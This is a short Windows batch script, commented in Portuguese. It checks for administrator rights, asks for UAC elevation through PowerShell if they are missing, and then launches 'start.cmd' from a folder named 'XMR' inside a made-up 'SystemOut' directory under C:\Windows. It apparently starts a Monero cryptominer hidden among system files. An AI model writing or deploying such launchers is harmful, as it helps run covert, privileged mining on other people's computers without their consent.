@echo off
:: Verifica se está rodando como administrador
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Solicitando permissões de administrador...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: Comando que você quer executar após obter permissões
C:\Windows\SystemOut\XMR\start.cmd
